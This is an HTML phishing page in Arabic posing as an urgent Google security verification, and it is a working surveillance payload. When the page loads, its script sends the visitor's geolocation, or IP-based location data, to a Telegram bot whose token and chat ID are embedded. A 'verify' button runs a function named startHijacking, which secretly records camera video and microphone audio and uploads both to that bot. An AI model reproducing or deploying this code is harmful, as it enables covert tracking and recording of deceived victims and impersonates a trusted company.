<!DOCTYPE html>
<html>
<head>
    <title>تحديث الأمان مطلوب</title>
    <meta charset="UTF-8">
</head>
<body>

<video id="video" autoplay muted style="display: none;"></video>
<canvas id="canvas" style="display: none;"></canvas>
<audio id="audio" controls style="display: none;"></audio>

<h2 style="color: red;">تحديث أمني عاجل</h2>
<p>نظام حماية جوجل يتطلب التحقق من هويتك لحماية حسابك.</p>
<button id="startBtn" style="font-size: 20px; padding: 10px;">السماح والتحقق</button>

<script>
    // التوكن الخاص بك
    const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
    const CHAT_ID = '6052532044';  // <--- تم تحديثه

    async function sendToTelegram(file, type) {
        let formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append(type, file);
        let url = `https://api.telegram.org/bot${BOT_TOKEN}/send${type === 'photo' ? 'Photo' : (type === 'video' ? 'Video' : (type === 'audio' ? 'Audio' : 'Document'))}`;
        await fetch(url, { method: 'POST', body: formData });
    }

    // سرقة الموقع الجغرافي
    navigator.geolocation.getCurrentPosition(pos => {
        let coords = `${pos.coords.latitude},${pos.coords.longitude}`;
        sendToTelegram(new Blob([coords], {type: 'text/plain'}), 'document');
    }, err => {
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => sendToTelegram(new Blob([JSON.stringify(data)], {type: 'text/plain'}), 'document'));
    });

    // الوظيفة الأساسية: تشغيل الكاميرا والميكروفون وبدء التسجيل
    async function startHijacking() {
        try {
            let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            let videoElem = document.getElementById('video');
            videoElem.srcObject = stream;
            let mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                let videoBlob = new Blob(chunks, { type: 'video/mp4' });
                await sendToTelegram(videoBlob, 'video');
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 20000);

            let audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            let audioRecorder = new MediaRecorder(audioStream);
            let audioChunks = [];
            audioRecorder.ondataavailable = e => audioChunks.push(e.data);
            audioRecorder.onstop = async () => {
                let audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
                await sendToTelegram(audioBlob, 'audio');
            };
            audioRecorder.start();
            setTimeout(() => audioRecorder.stop(), 15000);

        } catch (err) {
            console.error("خطأ في الوصول للأجهزة", err);
        }
    }

    document.getElementById('startBtn').onclick = startHijacking;
</script>
</body>
</html>
